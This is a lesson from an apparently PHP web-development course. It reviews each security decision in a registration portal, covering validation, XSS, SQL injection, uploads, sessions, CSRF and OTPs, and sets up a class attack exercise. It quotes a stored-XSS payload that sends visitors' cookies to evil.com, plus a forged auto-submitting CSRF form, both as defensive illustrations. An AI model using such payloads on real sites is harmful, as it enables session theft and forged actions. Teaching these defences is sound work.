# Lesson 12 — Security review

**Goal:** go back through the application we built and name every decision
that was a security decision. Nothing new is built today. Everything is
recognised.

Run this as an attack session, not a lecture. Give the class the URL and an
hour to break it.

---

## 1. The one idea underneath all of it

> Everything that arrives with a request is written by someone you have
> never met.

The URL. The form fields. The uploaded file and its name. The JSON body. The
cookies. The headers. All of it is typed by a stranger and none of it is
checked by anything until your PHP checks it.

Three habits follow, and between them they cover most of this list:

1. **Validate on arrival** — is this one of the values I allow?
2. **Escape on the way out** — HTML, SQL and email each need different
   escaping, applied at the moment of use.
3. **Never trust the client for identity or permission** — those come from
   the session.

---

## 2. Input

| Where | What we did | Where it lives |
|---|---|---|
| `?type=` | allow list of two roles | `register.php` |
| every text field | `trim()`, then required/format checks | `register.php` |
| email | `filter_var(..., FILTER_VALIDATE_EMAIL)` | `functions.php` |
| phone | `preg_match('/^[6-9][0-9]{9}$/')` | `functions.php` |
| graduation year | `ctype_digit()` then a range | `register.php` |
| every dropdown | `in_array($value, $allowed, true)` | `register.php` |
| OTP | `preg_match('/^[0-9]{6}$/')` | `verify-otp.php` |

**Allow list, not block list.** You cannot enumerate every bad input a
stranger can send; you can enumerate the good ones. This is the single most
transferable idea in the module.

**A `<select>` is not a restriction.** Nor is `type="number"`, nor
`maxlength`, nor `required`. Every one of those is a request to the browser.
The class watched you bypass all of them from the console in lesson 03.

---

## 3. Output — XSS

```php
echo $user['full_name'];            // vulnerable
echo e($user['full_name']);         // safe
```

If a name is `<script>fetch('http://evil.com?c='+document.cookie)</script>`
and you echo it raw, every visitor to that page sends their session cookie
to the attacker. That is **stored XSS** — stored because the payload sits in
your database waiting.

Our defences, in layers:

- `e()` (`htmlspecialchars`) on **every** value printed into HTML. Search the
  project: there is no bare `echo $row[...]` anywhere.
- `httponly` on the session cookie, so even a successful XSS cannot read it.
- `textContent` rather than `innerHTML` in our JavaScript, so a message from
  the server can never become markup.

Escape at output, not at input. The same string may later go into an email,
a JSON body or a PDF, and each needs a different escape.

---

## 4. Database — SQL injection

Every query in this project is `prepare()` + `execute()`. Go and check —
`grep` for `query(` and confirm that the only uses have no variables in the
string at all.

The reason it works is worth repeating precisely: the SQL is parsed before
the value exists, so the value can never be read as SQL. It is not filtering;
it is separation.

Also from the database side:

- `UNIQUE` on `users.email` — the real guarantee behind three layers of
  "is this email taken" checks.
- foreign keys — a `role_id` that does not exist cannot be stored.
- `ENUM` on `status` — only three values are possible.
- transactions — no half-written registrations.

One thing we did *not* do here: this project connects as `root`. See
section 11.

---

## 5. Passwords

- never stored, only `password_hash()` output
- `password_verify()` to check, which is constant-time
- same email/password message for both failures — no user enumeration
- the password is never logged, never echoed, never put in a URL
- `confirm_password` never leaves the request

### Rate limiting

Hashing is slow on purpose, but not slow enough to stop a script working
through a list of common passwords. So `api/login.php` counts failures:

```php
$stmt = $pdo->prepare(
    'SELECT COUNT(*) FROM login_attempts
     WHERE email = ? AND attempted_at > (NOW() - INTERVAL 15 MINUTE)'
);
```

Five failures and the account stops answering for fifteen minutes. A correct
password deletes the rows, so a few typos this morning cannot lock someone
out once they remember it.

Two details worth arguing about in class:

- **It counts by email, not by IP.** That stops someone hammering one
  account. It does *not* stop a botnet trying one common password against
  ten thousand accounts, which is what "credential stuffing" means. Real
  systems count both. We store the IP in the table so adding that check is a
  one-line change — ask the class to write it.
- **A locked account and a wrong password give the same `invalid_credentials`
  status.** Different message, same status, so the front end treats them
  alike and nobody learns which emails are worth attacking.

Old rows are deleted on each failure, so this table never needs a cron job.

---

## 6. File uploads

- `error` checked first
- `is_uploaded_file()` — it really came from this request
- size limit, enforced in PHP and not by the browser
- **`finfo` reads the actual bytes** — the extension and the browser's
  `type` are both claims
- allow list of three MIME types, and *we* pick the extension
- random filename via `random_bytes()` — no collisions, no traversal, no
  `.php`
- `move_uploaded_file()`, never `rename()`
- `uploads/.htaccess` is `Require all denied` — nothing in there is
  reachable from the web, as a program or as a file

### Getting a file back out

Because the folder is closed, `public/document.php` is the only way to read
an upload, and it checks first:

```php
require_login();

// ... look the row up by id ...

$isOwner = (int) $document['user_id'] === $_SESSION['user_id'];
$isStaff = current_role() === 'employee';

if (!$isOwner && !$isStaff) {
    abort(404, 'That document does not exist.');
}
```

A refused document and a missing one give the same 404, so nobody can walk
`?id=1,2,3…` and map out how many documents exist.

Then the file is streamed with a scrubbed filename (`original_name` came
from the user, and a newline in it would let them write their own headers)
and `X-Content-Type-Options: nosniff`, so the browser cannot decide a
user-uploaded file "looks like" HTML and run it in our origin.

For a real deployment, move `uploads/` outside the web root entirely — then
a misconfigured server cannot expose it even by accident. Ours sits inside
the project only to keep the XAMPP setup to a single copy-paste.

---

## 7. Sessions

- `session_regenerate_id(true)` on login and on OTP verification —
  session fixation
- `httponly` — JavaScript cannot read the cookie
- `samesite=Lax` — partial CSRF protection
- `secure` — set automatically when the connection is HTTPS
- logout empties `$_SESSION`, expires the cookie **and** destroys the file
- the session stores an id, never a role the client could edit
- password reset logs every session out

---

## 8. Authorization

- `require_login()` and `require_role()` at the top of every protected page
- 401 vs 403 — "who are you" vs "not allowed"
- every user lookup is keyed on the session user id, never on one from the
  URL (**IDOR**)
- `document.php` looks a document up by its id, then checks it against the
  session before sending a single byte
- the login endpoint decides the redirect; JavaScript only follows it
- staff accounts exist only via `php bin/create-employee.php`, which refuses
  to run anywhere but a terminal

> Hiding a button is not authorization. The server must refuse.

---

## 9. CSRF

The attack: you are logged in to our portal. You open `evil.com`, which
contains

```html
<form action="http://localhost/nxtwave-portal/public/admin-dashboard.php" method="post">
    <input type="hidden" name="user_id" value="7">
    <input type="hidden" name="decision" value="active">
</form>
<script>document.forms[0].submit();</script>
```

Your browser attaches your session cookie, because cookies go by
destination, not by who asked. To our server it looks like you clicked
Approve.

The fix, in `admin-dashboard.php`:

```php
<input type="hidden" name="csrf_token" value="<?= e(csrf_token()) ?>">
```

```php
if (!csrf_is_valid($_POST['csrf_token'] ?? null)) {
    http_response_code(403);
    exit('Bad request token.');
}
```

A random secret, stored in the session, rendered into our own forms.
`evil.com` cannot read it — the browser's same-origin policy stops that — so
its forged POST has no token and is rejected.

`hash_equals()` rather than `===` for the comparison: it takes the same time
whatever the input, so an attacker cannot discover the token one character at
a time by measuring response times. Overkill here; a good habit everywhere.

`samesite=Lax` on our cookie already blocks most of this attack. Both
together is the point — each layer assumes the other might fail.

---

## 10. OTP

- `random_int()`, not `rand()`
- stored hashed
- 15 minute expiry, computed by MySQL so there is one clock
- one-time use via `used_at`
- 5 attempt cap, incremented in SQL
- 3 requests per 15 minutes
- asking for a new code kills the old ones
- spent and expired rows are deleted
- identity between steps comes from the session, not the request body

---

## 11. Things this project does not do

Be honest about the edges. A student who knows the boundary of what they
built is more trustworthy than one who thinks they built everything.

- **HTTPS.** Everything above is undone if the connection is plain HTTP —
  the password, the session cookie and the OTP are all readable on the wire.
  On a real deployment: a TLS certificate and a redirect from HTTP. The
  `secure` cookie flag then switches itself on, because
  `!empty($_SERVER['HTTPS'])` becomes true.
- **`DEBUG` is still `true`.** In `includes/bootstrap.php`. It must be
  `false` before anyone outside the room can reach the site, or a PHP notice
  will print your file paths on the page.
- **Password strength.** We check length and nothing else. `12345678`
  passes. A real check tests the password against a list of the few thousand
  most common ones. (Length beats forced symbols — a rule demanding
  `P@ssw0rd!` mostly produces `P@ssw0rd!`.)
- **Email verification at registration.** Anyone can register with anyone
  else's address. The OTP machinery from lesson 11 is most of what you would
  need to fix it — same table shape, same expiry, different trigger.
- **Credential stuffing.** The rate limit counts per account, not per IP.
  See section 5.
- **Uploads inside the web root.** Denied by `.htaccess`, which works, but a
  server misconfiguration would undo it. Outside the web root, nothing can.
- **Secrets in files.** `config/mail.php` holds a real Gmail app password,
  in plain text, readable by anyone with the folder. It is in `.gitignore`,
  which stops it reaching a repository but not much else. A production app
  reads it from an environment variable instead, so the secret lives in the
  server's configuration and never in a file you can accidentally copy,
  email or screen-share. Rotate the app password when the module ends.
- **One database user.** We connect as `root`, which can do anything to any
  database on the server. Production creates a user with `SELECT, INSERT,
  UPDATE, DELETE` on this one database and nothing more, so a bug cannot
  drop a table or read the neighbouring app's data.

Naming an honest gap is part of the job. A security review that finds
nothing is a security review that was not done.

---

## 12. The exercise

Split the class in two. One half attacks for forty minutes, the other half
fixes. Then swap.

Attack list to hand out:

1. Register as `?type=employee`.
2. Get `<script>alert(1)</script>` to run on a dashboard.
3. Log in without a password using SQL injection.
4. Upload a `.php` file and execute it.
5. Read another user's documents.
6. Open a dashboard that is not for your role.
7. Reuse an OTP.
8. Use an OTP after 15 minutes.
9. Change someone else's password.
10. Register two accounts with the same email.
11. Open an uploaded file without logging in.
12. Read another user's document by trying ids.
13. Create yourself a staff account.
14. Brute force one account with 50 password guesses.

All fourteen should fail. For each one, the defender has to point at the exact
line that stopped it — not "we validate inputs", but
`in_array($type, $allowedTypes, true)` on line 29 of `register.php`.

If anything succeeds, that is the best possible outcome for the lesson. Fix
it together.

---

## 13. What you learned building this

Not a list of PHP functions — a working application, and the reasoning
behind every piece of it.

```
PHP syntax, superglobals, includes        lessons 00, 02
HTML forms, GET vs POST                   lesson 03
Validation and sanitization               lessons 03, 12
MySQL, schema design, relationships       lessons 01, 07
PDO, CRUD, prepared statements            lesson 04
Transactions                              lessons 04, 11
Password hashing and verification         lessons 05, 09
File uploads and file validation          lesson 06
AJAX, fetch, JSON, REST-style endpoints   lessons 08, 09, 11
Authentication                            lesson 09
Sessions and session security             lesson 10
Authorization and role-based access       lesson 10
Secure randomness                         lesson 11
Timestamps and expiry logic               lesson 11
Transactional email                       lesson 11
XSS, SQL injection, CSRF, IDOR            lesson 12
```

Every one of those arrived because the application needed it. That is why
they will still be there next month.

← [Back to the syllabus](../README.md)
